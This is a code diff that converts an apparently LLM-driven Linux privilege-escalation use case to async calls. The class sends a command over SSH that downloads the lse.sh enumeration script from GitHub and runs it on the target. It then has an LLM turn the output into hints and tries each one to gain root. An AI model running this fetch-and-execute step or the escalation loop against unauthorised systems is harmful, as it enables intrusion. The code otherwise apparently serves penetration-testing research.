@@ -30,12 +30,12 @@ class ExPrivEscLinuxLSEUseCase(UseCase):
     _got_root: bool = False
 
     # simple helper that uses lse.sh to get hints from the system
-    def call_lse_against_host(self):
+    async def call_lse_against_host(self):
         self.log.console.print("[green]performing initial enumeration with lse.sh")
 
         run_cmd = "wget -q 'https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh' -O lse.sh;chmod 700 lse.sh; ./lse.sh -c -i -l 0 | grep -v 'nope$' | grep -v 'skip$'"
 
-        result, _ = SSHRunCommand(conn=self.conn, timeout=120)(run_cmd)
+        result = await SSHRunCommand(conn=self.conn, timeout=120)(run_cmd)
 
         self.log.console.print("[yellow]got the output: " + result)
         cmd = self.llm.get_response(template_lse, lse_output=result, number=3)
@@ -46,21 +46,21 @@ class ExPrivEscLinuxLSEUseCase(UseCase):
     def get_name(self) -> str:
         return self.__class__.__name__
 
-    def run(self, configuration={}):
+    async def run(self, configuration={}):
         # get the hints through running LSE on the target system
-        hints = self.call_lse_against_host()
+        hints = await self.call_lse_against_host()
         turns_per_hint = int(self.max_turns / len(hints))
 
         # now try to escalate privileges using the hints
         for hint in hints:
             self.log.console.print("[yellow]Calling a use-case to perform the privilege escalation")
-            result = self.run_using_usecases(hint, turns_per_hint)
+            result = await self.run_using_usecases(hint, turns_per_hint)
 
             if result is True:
                 self.log.console.print("[green]Got root!")
                 return True
 
-    def run_using_usecases(self, hint, turns_per_hint):
+    async def run_using_usecases(self, hint, turns_per_hint):
         # init usecase
         linux_privesc = PrivEscLinux(
             conn=self.conn,
@@ -74,4 +74,4 @@ class ExPrivEscLinuxLSEUseCase(UseCase):
         )
 
         linux_privesc.init()
-        return linux_privesc.run({})
+        return await linux_privesc.run({})
